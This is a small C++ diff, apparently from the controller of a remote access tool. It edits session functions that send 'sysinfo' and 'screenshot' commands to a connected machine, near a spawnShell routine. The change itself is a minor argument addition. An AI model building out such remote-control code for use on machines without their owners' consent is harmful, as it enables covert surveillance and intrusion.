@@ -143,13 +143,13 @@ void INTERFACE::spawnShell(){
     }
 }
 void INTERFACE::sysinfoSession(){
-    bool status = this->middle_face->sendData(current_descriptor, "sysinfo");
+    bool status = this->middle_face->sendData(current_descriptor, "sysinfo", false);
     if(status){
         cout << this->middle_face->receiveData(current_descriptor) << endl;
     }
 }
 void INTERFACE::screenshotSession(){
-    bool status = this->middle_face->sendData(current_descriptor, "screenshot");
+    bool status = this->middle_face->sendData(current_descriptor, "screenshot", false);
     string towrite;
     fstream writer;
     if(status){
